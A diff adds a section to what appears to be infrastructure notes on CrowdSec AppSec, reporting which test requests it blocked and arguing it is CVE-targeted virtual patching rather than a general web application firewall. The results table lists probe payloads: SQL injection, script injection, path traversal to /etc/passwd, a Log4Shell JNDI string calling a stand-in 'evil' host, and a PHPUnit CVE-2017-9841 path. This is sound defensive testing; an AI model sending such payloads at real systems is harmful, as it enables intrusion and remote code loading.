@@ -650,6 +650,47 @@ were impossible. Anyone enabling `crowdsecAppsecEnabled: true` together with
 `crowdsecAppsecUnreachableBlock: true`, which is what `crowdsec-strict`
 specifies, would have had every request answered with 403.
 
+## 28. AppSec is virtual patching, not a web application firewall
+
+**Measured**, once the engine was reachable, against `crowdsec-appsec` on a
+public router:
+
+| Request | Result |
+|---|---|
+| `?id=1' OR '1'='1` | 200 |
+| `?q=<script>alert(1)</script>` | 200 |
+| `?f=../../../../etc/passwd` | 200 |
+| `?x=${jndi:ldap://evil/a}` | 200 |
+| `/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php` | **403** |
+
+The engine counted every one of them as processed, so nothing was bypassing it.
+It blocked the last: CVE-2017-9841, a signature in `appsec-virtual-patching`.
+
+**What that means.** The shipped rule sets are `appsec-generic-rules` — a small,
+deliberately narrow set — and `appsec-virtual-patching`, which targets named
+CVEs. Neither is a general injection filter. Calling this a WAF sets the wrong
+expectation in both directions:
+
+- It will **not** stop a novel SQL injection against an application's own
+  parameters. Anyone treating it as a reason to relax input handling has
+  misread it.
+- It also will **not** generate the false positives that reputation implies.
+  The repository's own documentation defers `crowdsec-appsec` pending per-app
+  false-positive testing on Nextcloud WebDAV, Invoice Ninja webhooks and
+  Authentik SAML. With rules this narrow, that risk is smaller than the
+  deferral suggests.
+
+**What it is good for**, and it is not nothing: the mass-scanning traffic that
+arrives at any public host within minutes of a certificate being issued. That
+traffic is almost entirely known-CVE probing, which is exactly what virtual
+patching covers.
+
+**Consequence.** `crowdsec-appsec` is a reasonable default for a public app,
+because it is fail-open and its rules are conservative. `crowdsec-strict`
+remains something to argue for per application, since fail-closed turns any
+engine problem into an outage. And the appsec section of the documentation
+should stop implying WAF-grade coverage.
+
 ## What worked, session 2
 
 - The wildcard certificate covered the new subdomain with **no second certificate
